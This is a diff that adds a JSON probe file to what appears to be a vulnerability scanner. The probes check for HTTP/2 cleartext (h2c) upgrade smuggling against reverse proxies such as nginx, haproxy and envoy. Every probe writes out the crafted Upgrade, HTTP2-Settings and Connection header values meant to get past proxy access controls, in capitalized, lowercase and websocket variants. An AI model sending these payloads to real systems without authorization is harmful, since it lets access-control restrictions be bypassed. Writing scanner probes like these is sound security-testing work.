@@ -1,0 +1,51 @@
+{
+  "category": "h2c_smuggling",
+  "contexts": {
+    "upgrade_bypass": {
+      "description": "HTTP/2 cleartext (h2c) upgrade smuggling — send Upgrade: h2c to bypass reverse proxy ACLs. The proxy does not understand h2c and forwards the request to the backend, which upgrades and processes requests outside the proxy's access control.",
+      "tech_match": ["nginx", "haproxy", "aws", "alb", "cloudfront", "envoy"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "h2c upgrade request — if backend returns 101 Switching Protocols, the connection bypasses the reverse proxy's path-based ACL",
+          "matchers": [{"type": "status", "status": [101]}, {"type": "word", "words": ["Switching Protocols", "Upgrade", "h2c"]}],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {"header": "Upgrade: h2c\r\nHTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA\r\nConnection: Upgrade, HTTP2-Settings"}
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "h2c upgrade with lowercase headers — some proxies only filter capitalized Upgrade",
+          "matchers": [{"type": "status", "status": [101]}, {"type": "word", "words": ["Switching Protocols"]}],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {"header": "upgrade: h2c\r\nhttp2-settings: AAMAAABkAAQCAAAAAAIAAAAA\r\nconnection: upgrade, http2-settings"}
+        }
+      ]
+    },
+    "connection_header_injection": {
+      "description": "Test if the reverse proxy strips or passes the Connection hop-by-hop header. If it passes Connection: Upgrade, h2c, the backend may upgrade the connection out from under the proxy.",
+      "tech_match": ["nginx", "haproxy", "apache", "varnish", "traefik"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Connection: keep-alive, Upgrade — test if the proxy passes hop-by-hop headers to backend",
+          "matchers": [{"type": "status_diff"}, {"type": "word", "words": ["Upgrade", "upgrade"]}],
+          "severity": "medium",
+          "confidence_boost": 30,
+          "variables": {"header": "Connection: keep-alive, Upgrade\r\nUpgrade: h2c"}
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "Websocket upgrade to h2c variant — some proxies allow websocket upgrades but not h2c; test if the mechanism works for h2c too",
+          "matchers": [{"type": "status", "status": [101, 200]}, {"type": "status_diff"}],
+          "severity": "medium",
+          "confidence_boost": 30,
+          "variables": {"header": "Connection: Upgrade\r\nUpgrade: h2c\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ=="}
+        }
+      ]
+    }
+  }
+}
